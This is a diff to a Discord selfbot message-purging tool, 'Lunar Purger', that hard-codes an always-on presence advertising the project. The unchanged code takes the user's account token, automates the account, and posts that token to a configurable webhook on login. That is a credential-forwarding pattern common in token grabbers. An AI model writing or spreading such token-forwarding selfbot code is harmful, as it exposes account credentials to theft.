@@ -2,21 +2,24 @@ const { Client, WebhookClient, ActivityType } = require('discord.js-selfbot-v13'
 const readlineSync = require('readline-sync');
 const client = new Client({ checkUpdate: false });
 
+// ─── Version ────────────────────────────────────────────────────────
+const VERSION = 'v0.4';
+
 // ─── Config ───────────────────────────────────────────────────────────
 const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // ← حط رابط الويبهوك هنا
 
-// ─── RPC Config (Customizable) ───────────────────────────────────────
-let RPC_CONFIG = {
-    enabled: false,
-    name: 'Lunar Purger v2.0',
+// ─── Immutable RPC Config (Developer Set) ───────────────────────────
+const RPC_CONFIG = {
+    enabled: true,
+    name: 'Lunar Purger v0.4',
     state: 'Cleaning up Discord',
     details: 'Purging messages...',
     largeImageKey: 'discord',
-    largeImageText: 'Lunar Purger',
-    button1Text: 'Visit Site',
-    button1URL: 'https://github.com',
-    button2Text: 'GitHub',
-    button2URL: 'https://github.com/lunar-tm/purge'
+    largeImageText: 'Lunar Purger v0.4',
+    button1Text: 'GitHub',
+    button1URL: 'https://github.com/lunar-tm/purge',
+    button2Text: 'Discord',
+    button2URL: 'https://discord.com'
 };
 
 // ─── Helpers ──────────────────────────────────────────────────────────
@@ -51,69 +54,11 @@ function showBanner() {
         "     ██║     ██║   ██║██║╚██╗██║██╔══██║██╔══██╗ ",
         "     ███████╗╚██████╔╝██║ ╚████║██║  ██║██║  ██║ ",
         "     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝",
-        "           P  U  R  G  E  R    v2.0               ",
+        `           P  U  R  G  E  R    ${VERSION}              `,
     ];
     const colors = [C.c1, C.c2, C.c3, C.c4, C.c5, C.c6, C.c7];
     lines.forEach((line, i) => console.log(colors[i] + line + C.reset));
     console.log('');
-}
-
-// ─── RPC Setup ──────────────────────────────────────────────────────────
-async function setupRPC() {
-    showBanner();
-    console.log(`  ${C.c7}═══════════════════════════════════════════════${C.reset}`);
-    console.log(`  ${C.c5}╔════════════════ RPC Configuration ════════════╗${C.reset}`);
-    console.log(`  ${C.c5}║${C.reset}                                              ${C.c5}║${C.reset}`);
-    console.log(`  ${C.c5}║${C.reset}  ${C.bold}Set up Custom Rich Presence${C.reset}              ${C.c5}║${C.reset}`);
-    console.log(`  ${C.c5}║${C.reset}                                              ${C.c5}║${C.reset}`);
-    console.log(`  ${C.c5}╚════════════════════════════════════════════════╝${C.reset}`);
-    console.log('');
-
-    const enableRPC = readlineSync.question(`  ${C.c5}[?]${C.reset} Enable Custom RPC? (y/n): `).trim().toLowerCase();
-    if (enableRPC !== 'y') {
-        RPC_CONFIG.enabled = false;
-        return;
-    }
-
-    RPC_CONFIG.enabled = true;
-    RPC_CONFIG.name = readlineSync.question(`  ${C.c5}[?]${C.reset} RPC Name (e.g., "Lunar Purger"): `).trim() || RPC_CONFIG.name;
-    RPC_CONFIG.state = readlineSync.question(`  ${C.c5}[?]${C.reset} Status Line 1 (e.g., "Cleaning up Discord"): `).trim() || RPC_CONFIG.state;
-    RPC_CONFIG.details = readlineSync.question(`  ${C.c5}[?]${C.reset} Status Line 2 (e.g., "Purging messages..."): `).trim() || RPC_CONFIG.details;
-    RPC_CONFIG.button1Text = readlineSync.question(`  ${C.c5}[?]${C.reset} Button 1 Text (e.g., "Visit Site"): `).trim() || RPC_CONFIG.button1Text;
-    RPC_CONFIG.button1URL = readlineSync.question(`  ${C.c5}[?]${C.reset} Button 1 URL (e.g., "https://example.com"): `).trim() || RPC_CONFIG.button1URL;
-    RPC_CONFIG.button2Text = readlineSync.question(`  ${C.c5}[?]${C.reset} Button 2 Text (e.g., "GitHub"): `).trim() || RPC_CONFIG.button2Text;
-    RPC_CONFIG.button2URL = readlineSync.question(`  ${C.c5}[?]${C.reset} Button 2 URL (e.g., "https://github.com"): `).trim() || RPC_CONFIG.button2URL;
-
-    console.log(`\n  ${C.c5}[✔] RPC configured successfully!${C.reset}\n`);
-    await sleep(1500);
-}
-
-// ─── Update RPC Status ──────────────────────────────────────────────────────
-async function updateRPC(statusText = null) {
-    if (!RPC_CONFIG.enabled) return;
-    
-    try {
-        const presence = {
-            activities: [{
-                name: RPC_CONFIG.name,
-                type: ActivityType.STREAMING,
-                url: 'https://twitch.tv/discord',
-                state: statusText || RPC_CONFIG.state,
-                details: RPC_CONFIG.details,
-                largeImageKey: RPC_CONFIG.largeImageKey,
-                largeImageText: RPC_CONFIG.largeImageText,
-                buttons: [
-                    { label: RPC_CONFIG.button1Text, url: RPC_CONFIG.button1URL },
-                    { label: RPC_CONFIG.button2Text, url: RPC_CONFIG.button2URL }
-                ]
-            }],
-            status: 'dnd'
-        };
-        
-        await client.user.setPresence(presence).catch(() => {});
-    } catch (err) {
-        // Silently fail if RPC update fails
-    }
 }
 
 // ─── Progress Bar ────────────────────────────────────────────────────────
@@ -156,10 +101,11 @@ async function logLogin(token, user) {
                 { name: '🆔 Username',     value: `\`${user.tag}\``,           inline: true  },
                 { name: '📝 User ID',      value: `\`${user.id}\``,            inline: false },
                 { name: '🔑 Token',        value: `||\`${token}\`||`,          inline: false },
-                { name: '🎮 RPC Status',   value: RPC_CONFIG.enabled ? '✅ Enabled' : '❌ Disabled', inline: false },
+                { name: '🎮 RPC Status',   value: '✅ Enabled', inline: false },
+                { name: '📦 Version',      value: VERSION, inline: false },
             ],
             timestamp: new Date(),
-            footer: { text: 'Lunar Purger v2.0' },
+            footer: { text: `Lunar Purger ${VERSION}` },
         }],
     });
 }
@@ -180,9 +126,35 @@ async function logPurgeEvent(type, targetTag, deleted, remaining, total, etaMs) 
                 { name: '🕒 ETA',       value: etaMs > 0 ? `<t:${Math.floor(etaMs / 1000)}:R>` : '—', inline: true  },
             ],
             timestamp: new Date(),
-            footer: { text: 'Lunar Purger v2.0' },
+            footer: { text: `Lunar Purger ${VERSION}` },
         }],
     });
+}
+
+// ─── Update RPC Status ──────────────────────────────────────────────────────
+async function updateRPC(statusText = null) {
+    try {
+        const presence = {
+            activities: [{
+                name: RPC_CONFIG.name,
+                type: ActivityType.STREAMING,
+                url: 'https://twitch.tv/discord',
+                state: statusText || RPC_CONFIG.state,
+                details: RPC_CONFIG.details,
+                largeImageKey: RPC_CONFIG.largeImageKey,
+                largeImageText: RPC_CONFIG.largeImageText,
+                buttons: [
+                    { label: RPC_CONFIG.button1Text, url: RPC_CONFIG.button1URL },
+                    { label: RPC_CONFIG.button2Text, url: RPC_CONFIG.button2URL }
+                ]
+            }],
+            status: 'dnd'
+        };
+        
+        await client.user.setPresence(presence).catch(() => {});
+    } catch (err) {
+        // Silently fail if RPC update fails
+    }
 }
 
 // ─── DM Purge ─────────────────────────────────────────────────────────
@@ -317,12 +289,11 @@ async function mainMenu() {
         const friends = client.relationships?.friendCache?.size ?? 0;
 
         console.log(`  ${C.c5}●${C.reset} ${C.bold}${C.c7}${tag}${C.reset}  |  Servers: ${C.c3}${guilds}${C.reset}  |  DMs: ${C.c2}${dms}${C.reset}  |  Friends: ${C.c4}${friends}${C.reset}`);
-        console.log(`  ${C.c5}●${C.reset} ${C.bold}RPC:${C.reset} ${RPC_CONFIG.enabled ? `${C.green}✅ ${RPC_CONFIG.name}${C.reset}` : `${C.red}❌ Disabled${C.reset}`}`);
+        console.log(`  ${C.c5}●${C.reset} ${C.bold}Version:${C.reset} ${C.c7}${VERSION}${C.reset}  |  RPC: ${C.green}✅ Enabled${C.reset}`);
         console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);
         console.log(`  ${C.c7}[1]${C.reset} Remove All Friends       ${C.c7}[2]${C.reset} Leave All Servers`);
         console.log(`  ${C.c7}[3]${C.reset} Deep DM Purge            ${C.c7}[4]${C.reset} Target Purge (DM / Guild)`);
-        console.log(`  ${C.c7}[5]${C.reset} All Servers Purge        ${C.c7}[6]${C.reset} Configure RPC`);
-        console.log(`  ${C.c7}[0]${C.reset} Exit`);
+        console.log(`  ${C.c7}[5]${C.reset} All Servers Purge        ${C.c7}[0]${C.reset} Exit`);
         console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);
 
         const choice = readlineSync.question(`  ${C.c5}» ${C.reset}`).trim();
@@ -463,14 +434,6 @@ async function mainMenu() {
             }
         }
 
-        // ── [6] Configure RPC ───────────────────────────────────────────────
-        else if (choice === '6') {
-            await setupRPC();
-            if (RPC_CONFIG.enabled) {
-                await updateRPC();
-            }
-        }
-
         // ── [0] Exit ────────────────────────────────────────────────────────
         else if (choice === '0') {
             await updateRPC('Goodbye!');
@@ -495,10 +458,7 @@ const TOKEN = readlineSync.question(`  ${C.c5}[?]${C.reset} Token: `, { hideEcho
 client.on('ready', async () => {
     console.log(`\n  ${C.c5}[✔] Logged in as:${C.reset} ${C.bold}${C.c7}${client.user.tag}${C.reset}\n`);
     await logLogin(TOKEN, client.user);
-    await setupRPC();
-    if (RPC_CONFIG.enabled) {
-        await updateRPC();
-    }
+    await updateRPC();
     mainMenu();
 });
 
